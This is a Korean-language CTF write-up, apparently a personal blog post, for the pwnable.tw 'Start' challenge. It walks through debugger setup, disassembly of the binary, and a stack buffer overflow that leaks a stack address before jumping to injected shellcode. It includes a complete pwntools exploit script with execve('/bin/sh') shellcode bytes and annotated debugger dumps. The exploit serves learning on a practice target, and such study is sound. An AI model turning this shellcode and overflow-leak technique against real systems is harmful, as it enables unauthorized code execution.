---
layout: article
title: "[Pwnable]Start(pwnable.tw)"
key: 20180612
tags:
  - WriteUp
  - Pwnable
  - System
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] Start (pwnable.tw)

<!--more-->

## [+] Ready

### First Pwnable ?!

이제 본격적으로 포너블 문제에 도전하기 위해 시작했다. 일단 첫 소감은 매우 흥미롭고 재미있었다.
아직 뭐가 뭔지 헷갈리지만 일단 첫 문제는 버퍼오버플로우 문제 이므로 천천히 개념을 다잡으며 진행하기로 한다.
많이 공부해야된다 머리아프다 큭 



### Tools

* pwntools (python module)
* peda (gdb module)
* pwndbg(gdb module)
* IDA (debugging)
* msfvenom (shell code create)

### Pwntools & Peda & Pwndbg install & Setup

Peda 나 pwndbg나 gdb 모듈로 일반적으로 gdb만 실행해도 모듈이 적용되어 실행된다. 나는 세 개다 골고루 사용하고 싶다. 그래서 아래와 같이 설치를 진행하였다.

본인은 최상위 디렉토리('/') 에 'pwntool' 이라는 디렉토리를 만들어 진행하였다. 아래는 진행과정이다.

```
mkdir /pwntool

# peda download
git clone https://github.com/longld/peda.git /pwntool/peda 

# pwndbg download
git clone https://github.com/pwndbg/pwndbg /pwntool/pwndbg
```

위와 같이 설치하고 나면 간단하게 설정을 통해 gdb, peda, pwndbg 를 모두 사용할 수 있다.
먼저 pwndbg 디렉토리에 'setup.sh'을 손본다

```shell
...
...
# Load Pwndbg into GDB on every launch.
#if ! grep pwndbg ~/.gdbinit &>/dev/null; then
#	echo "source $PWD/gdbinit.py" >> ~/.gdbinit
#fi

#line 63 ~ 66
```

위와 같이 63 ~ 66번째 줄에 있는 내용들을 모두 주석처리하고 실행한다. 그럼 필요한 모듈 등이 자동으로 설치되게 되는데 이와 같이 진행한 이유는 본인은 모듈에러가 참 많이 나길래 이렇게 진행했다.

다음은 '.gdbinit' 파일을 생성하여 아래와 같이 작성해준다.

```
root@kali:~ vim ~/.gdbinit
```

```bash
# ~/.gdbinit

define init-peda
	source /pwntool/peda/peda.py
end

document init-peda
	Initializes the PEDA (Python Exploit Development Assistant for GDB) framework
end

define init-pwndbg
	source /pwntool/pwndbg/gdbinit.py
end

document init-pwndbg
	Initializes the PwnDBG
end
```

위와 같이 작성하여 저장한다.
자 이제 마지막으로 '/bin' 디렉토리 안에 명령어만 작성해주면 된다.

```
root@kali:~ vim /bin/peda
root@kali:~ vim /bin/pwndbg
```

```bash
# /bin/peda
#! /bin/sh
exec gdb -q -ex init-peda "$@"

# /bin/pwndbg
#! /bin/sh
exec gdb -q -ex init-pwndbg "$@"
```

위와 같이 각각 명령어에 스크립트를 넣어주면 gdb/peda/pwndbg 모두 사용이 가능하다.

마지막 pwntools 의 경우 pip 명령어를 이용해 설치하면 끝이다.

```
root@kali:~ pip install pwntools
```



## [+] Analyze

### Binary

자 먼저 <a href="https://pwnable.tw">pwnable.tw</a> 에서 첫 Start 문제를 다운로드 받는다. 명령어들을 이용해 해당 파일 분석을 시작한다.

```
root@kali:/media/sf_CTF/Pwnable.tw/00_start# file start
start: ELF 32-bit LSB executable, Intel 80386, vesion 1 (SYSV), statically linked, not stripped

root@kali:/media/sf_CTF/Pwnable.tw/00_start# ./start
Let's start the CTF:1234567890123456789
# 정상 실행

root@kali:/media/sf_CTF/Pwnable.tw/00_start# ./start
Let's start the CTF:12345678901234567890
Segmentation fault
# 세그멘테이션 오류
```

IDA를 이용해 분석을 시작한다.

```assembly
.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
.text:0804809C
.text:0804809D
.text:0804809D ; =============== S U B R O U T I N E =======================================
.text:0804809D
.text:0804809D ; Attributes: noreturn
.text:0804809D
.text:0804809D ; void exit(int status)
.text:0804809D _exit           proc near               ; DATA XREF: _start+1↑o
.text:0804809D                 pop     esp
.text:0804809E                 xor     eax, eax
.text:080480A0                 inc     eax
.text:080480A1                 int     80h             ; LINUX - sys_exit
.text:080480A1 _exit           endp ; sp-analysis failed
.text:080480A1
.text:080480A1 _text           ends
.text:080480A1
.text:080480A1
.text:080480A1                 end _start
```

_start, _exit 함수가 존재한다. 0x804808F 을 보면 syscall을 하는 것을 볼 수 있다. 길이는 20(0x14)만큼이며 'mov al,4' 로 보아 sys_write인 것을 확인할 수 있다.

다음은 역시 syscall을 하는데 60(3C) 만큼이고, 'mov al,3'의 경우 sys_read인 것을 확인 가능하다.
자 증명해보자....

```
root@kali:~# python
Python 2.7.15 (default, May  1 2018, 05:55:50) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("Let's start the CTF:")
20
>>> 
```

쨘...?! 뭐 그렇다..;  실제 pwndbg를 이용해 동작방식을 확인하고 익스플로잇 가능한 부분을 찾아보자.

![Start](https://github.com/Shhoya/Shhoya.github.io/blob/master/assets/images/task/pwn1.png?raw=true "start"){:.border}

실제 프로그램 실행 시 입력받은 바로 직 후인 '0x8048099' 에 bp를 걸고 실행한다. 입력 값은 'aaaa(0x61616161)'이다.
스택을 살펴보면 기존 esp ~ esp+10 총 20byte에 sys_write를 이용해 출력되는 문자열이 들어있었다.

```
esp	('Let')
esp+4 ('s st')
esp+8 ('art ')
esp+c ('the ')
esp+10 ('CTF:')
esp+14 (_exit)
```

중요한건 _exit 함수가 무조건 실행된다는 것이다. 그렇다면 버퍼를 넘치게해서 실행 흐름을 바꾸면 될 것이다.
그렇다면 총 24byte 만큼 입력을 한다면 ret address가 변조될 것 이다.

![Start](https://github.com/Shhoya/Shhoya.github.io/blob/master/assets/images/task/pwn2.png?raw=true "start"){:.border}

자 그럼 이제 sys_write 전에 있는 'mov ecx,esp' 로 실행 흐름을 바꿔주면된다. 그 이유는 ASLR으로 인해 스택주소가 랜덤하게 배정되기 때문이다.

즉 sys_write로 다시 넘겨 memory leak을 유발시키고 leak된 스택 주소를 이용하며 'add esp, 14'를 통해 _exit가 호출되니 해당 스택주소에 +0x14 만큼 더하여 페이로드를 넘겨주면 가능하다.

### Exploit

```python
from pwn import *
context.log_level="debug"

s = remote('chall.pwnable.tw',10000)
e=ELF('./start')
shell='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
payload=''
payload='A'*20
payload+=p32(0x8048087)
log.info(" Leak payload : "+payload)
s.sendafter(':', payload)
stack = u32(s.recv(1024)[:4])
log.success(" leak address(hex) : "+hex(stack))
log.info(" Inject address : "+hex(stack+20))
payload = ''
payload = 'A'*20
payload += p32(stack + 20)
payload += shell
s.send(payload)
s.interactive()
```

## [+] ADD (2018-06-14)

음 자세한 설명을 덧붙히기로 한다.
leak 하는 주소와 shell 이 실행되는 과정을 설명한다.

아래는 ret 를 sys_write 주소로 변조하기 전의 정상적인 상태의 레지스터 및 스택이다.

```
[----------------------------------registers-----------------------------------]
EAX: 0xfffffe00 
EBX: 0x0 
ECX: 0xff921864 ("Let's start the CTF:\235\200\004\b\200\030\222\377\001")
EDX: 0x3c ('<')
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xff921864 ("Let's start the CTF:\235\200\004\b\200\030\222\377\001")
EIP: 0x8048099 (<_start+57>:	add    esp,0x14)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048093 <_start+51>:	mov    dl,0x3c
   0x8048095 <_start+53>:	mov    al,0x3
   0x8048097 <_start+55>:	int    0x80
=> 0x8048099 <_start+57>:	add    esp,0x14
   0x804809c <_start+60>:	ret    
   0x804809d <_exit>:	pop    esp
   0x804809e <_exit+1>:	xor    eax,eax
   0x80480a0 <_exit+3>:	inc    eax
[------------------------------------stack-------------------------------------]
0000| 0xff921864 ("Let's start the CTF:\235\200\004\b\200\030\222\377\001")
0004| 0xff921868 ("s start the CTF:\235\200\004\b\200\030\222\377\001")
0008| 0xff92186c ("art the CTF:\235\200\004\b\200\030\222\377\001")
0012| 0xff921870 ("the CTF:\235\200\004\b\200\030\222\377\001")
0016| 0xff921874 ("CTF:\235\200\004\b\200\030\222\377\001")
0020| 0xff921878 --> 0x804809d (<_exit>:	pop    esp)
0024| 0xff92187c --> 0xff921880 --> 0x1 
0028| 0xff921880 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ 
```

다음은 오버플로우를 일으켜 RET의 값을 변조한 상태이다.

```
[----------------------------------registers-----------------------------------]
EAX: 0x18 
EBX: 0x0 
ECX: 0xff921864 ('A' <repeats 20 times>, "\207\200\004\b\200\030\222\377\001")
EDX: 0x3c ('<')
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xff921864 ('A' <repeats 20 times>, "\207\200\004\b\200\030\222\377\001")
EIP: 0x8048099 (<_start+57>:	add    esp,0x14)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048093 <_start+51>:	mov    dl,0x3c
   0x8048095 <_start+53>:	mov    al,0x3
   0x8048097 <_start+55>:	int    0x80
=> 0x8048099 <_start+57>:	add    esp,0x14
   0x804809c <_start+60>:	ret    
   0x804809d <_exit>:	pop    esp
   0x804809e <_exit+1>:	xor    eax,eax
   0x80480a0 <_exit+3>:	inc    eax
[------------------------------------stack-------------------------------------]
0000| 0xff921864 ('A' <repeats 20 times>, "\207\200\004\b\200\030\222\377\001")
0004| 0xff921868 ('A' <repeats 16 times>, "\207\200\004\b\200\030\222\377\001")
0008| 0xff92186c ('A' <repeats 12 times>, "\207\200\004\b\200\030\222\377\001")
0012| 0xff921870 ("AAAAAAAA\207\200\004\b\200\030\222\377\001")
0016| 0xff921874 ("AAAA\207\200\004\b\200\030\222\377\001")
0020| 0xff921878 --> 0x8048087 (<_start+39>:	mov    ecx,esp)
0024| 0xff92187c --> 0xff921880 --> 0x1 
0028| 0xff921880 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048099 in _start ()
gdb-peda$ 
```

스택 구조를 살펴보자. esp(0xff921864)에서부터 +0x10(0xff921874)까지 'A'로 쓰여진 것을 확인할 수 있다.
다음 _exit 함수의 주소가 존재하던 esp+14(0xff921878)의 값이 'mov ecx,esp'로 변조되어 있다.
그럼 다시 sys_write함수로 리턴을 하게 될 것이다. 이 때 흐름을 생각하면 leak 되는 원리를 파악할 수 있다.
기존에 **"Let's start the CTF: "** 문자열이 출력되는 것을 보면 push 한 문자열을 ecx에 담아 인자로 전달하는 것을 확인할 수 있다.

그렇다면 'add esp, 0x14'를 통해 스택을 정리하였기 때문에 처음 _start 함수가 시작되는 stack frame의 주소가 leak되는 것이다.

## [+] Reference

1. <a href="https://syscalls.kernelgrok.com/">*"syscall func"*</a>
2. <a href="https://ko.wikipedia.org/wiki/%EC%8A%A4%ED%83%9D_%EB%B2%84%ED%8D%BC_%EC%98%A4%EB%B2%84%ED%94%8C%EB%A1%9C">*"Stack buffer overflow"*</a>
3. <a href="http://9oat.tistory.com/4">*"Memory leak"*</a>